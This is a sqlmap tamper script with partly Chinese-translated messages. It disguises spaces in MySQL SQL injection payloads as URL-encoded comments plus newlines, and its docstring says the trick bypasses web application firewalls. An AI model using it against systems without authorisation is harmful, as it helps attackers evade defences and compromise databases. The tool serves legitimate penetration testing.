#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import random
import string

from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s' % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    "\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')\n\n    Requirement:\n        * MySQL\n\n    测试针对：\n        * MySQL 4.0, 5.0\n\n    Notes:\n        * 可用于绕过多个 Web 应用程序防火墙\n        * 在 ModSecurity SQL 注入挑战期间使用，\n          http://modsecurity.org/demo/challenge.html\n\n    >>> random.seed(0)\n    >>> tamper('1 AND 9227=9227')\n    '1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227'\n    "

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "%%23%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal
